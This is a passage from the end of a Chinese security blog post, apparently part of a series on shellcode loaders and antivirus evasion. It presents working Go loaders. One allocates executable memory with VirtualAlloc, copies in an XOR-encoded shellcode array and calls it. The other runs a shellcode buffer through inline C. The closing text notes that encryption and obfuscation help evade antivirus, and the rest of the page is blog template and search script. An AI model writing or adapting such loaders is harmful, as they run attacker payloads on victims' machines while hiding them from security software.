+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"syscall"</span></span><br><span class="line">	<span class="string">"unsafe"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	kernel32      = syscall.MustLoadDLL(<span class="string">"kernel32.dll"</span>)</span><br><span class="line">	ntdll         = syscall.MustLoadDLL(<span class="string">"ntdll.dll"</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.MustFindProc(<span class="string">"VirtualAlloc"</span>)</span><br><span class="line">	RtlCopyMemory = ntdll.MustFindProc(<span class="string">"RtlCopyMemory"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	xor_shellcode := []byte&#123;<span class="number">0x89</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x91</span>, <span class="number">0x85</span>, <span class="number">0x9d</span>, <span class="number">0xb9</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x25</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xa7</span>, <span class="number">0x10</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x15</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>...&#125;</span><br><span class="line"></span><br><span class="line">	addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="built_in">uint</span>ptr(len(xor_shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != nil &amp;&amp; err.Error() != <span class="string">"The operation completed successfully."</span> &#123;</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	_, _, err = RtlCopyMemory.Call(addr, (<span class="built_in">uint</span>ptr)(unsafe.Pointer(&amp;xor_shellcode[<span class="number">0</span>])), <span class="built_in">uint</span>ptr(len(xor_shellcode)))</span><br><span class="line">	<span class="keyword">if</span> err != nil &amp;&amp; err.Error() != <span class="string">"The operation completed successfully."</span> &#123;</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实原理与上面python或者C/C++类似。</p>
+<p>通过声明匿名函数,然后指向读入的ShellCode字节数据的那片内存，并将内存设置为可读可写可执行，之后调用函数就将ShellCode运行起来了。</p>
+<h4 id="内联C加载"><a href="#内联C加载" class="headerlink" title="内联C加载"></a>内联C加载</h4><p>核心代码如下：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"C"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"unsafe"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    buf := <span class="string">""</span></span><br><span class="line">    buf += <span class="string">"xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c"</span></span><br><span class="line">    ...省略...</span><br><span class="line">    buf += <span class="string">"xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2"</span></span><br><span class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></span><br><span class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></span><br><span class="line">    shellcode := []<span class="keyword">byte</span>(buf)</span><br><span class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    shellcode既然是一段二进制代码，那加载器的功能其实就是想办法将二进制写到内存中，并将这段内存设置为可执行。在这个过程中，为了逃避杀软，所以要更多采用加密混淆等操作。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/08/06/powershell-jia-zai-shellcode-mian-sha/goland-jia-zai-shellcode/" rel="next" title="powershell加载shellcode免杀/goland加载shellcode">
+                <i class="fa fa-chevron-left"></i> powershell加载shellcode免杀/goland加载shellcode
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/08/17/tidesec-mian-sha-fang-fa-zui-xin-sha-ruan-ce-shi-jie-guo/" rel="prev" title="Tidesec免杀方法最新杀软测试结果">
+                Tidesec免杀方法最新杀软测试结果 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="Shu1L" />
+            
+              <p class="site-author-name" itemprop="name">Shu1L</p>
+              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xun9er.com/" target="_blank" title="xun9er">
+                      
+                        <i class="fa fa-fw fa-globe"></i>xun9er</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://hack-for.fun/" target="_blank" title="M0nk3y">
+                      
+                        <i class="fa fa-fw fa-globe"></i>M0nk3y</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://106.15.121.121/" target="_blank" title="ttpfx">
+                      
+                        <i class="fa fa-fw fa-globe"></i>ttpfx</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.cnblogs.com/lyxf/" target="_blank" title="l0gan">
+                      
+                        <i class="fa fa-fw fa-globe"></i>l0gan</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.mythe.top/" target="_blank" title="mythe">
+                      
+                        <i class="fa fa-fw fa-globe"></i>mythe</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://cyzcc.vip/" target="_blank" title="cyzCc">
+                      
+                        <i class="fa fa-fw fa-globe"></i>cyzCc</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.d0g3.cn/" target="_blank" title="道格安全研究实验室">
+                      
+                        <i class="fa fa-fw fa-globe"></i>道格安全研究实验室</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python加载器"><span class="nav-number"></span> <span class="nav-text">python加载器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#加载器"><span class="nav-number"></span> <span class="nav-text">加载器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HEX加密"><span class="nav-number">1.</span> <span class="nav-text">HEX加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64加密"><span class="nav-number">2.</span> <span class="nav-text">base64加密</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C-加载器"><span class="nav-number"></span> <span class="nav-text">C++加载器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#函数指针执行"><span class="nav-number">1.</span> <span class="nav-text">函数指针执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#动态内存加载"><span class="nav-number">2.</span> <span class="nav-text">动态内存加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内联汇编指令"><span class="nav-number">3.</span> <span class="nav-text">内联汇编指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#伪指令"><span class="nav-number">4.</span> <span class="nav-text">伪指令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#go加载器"><span class="nav-number"></span> <span class="nav-text">go加载器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#动态内存加载-1"><span class="nav-number">1.</span> <span class="nav-text">动态内存加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内联C加载"><span class="nav-number">2.</span> <span class="nav-text">内联C加载</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shu1L</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
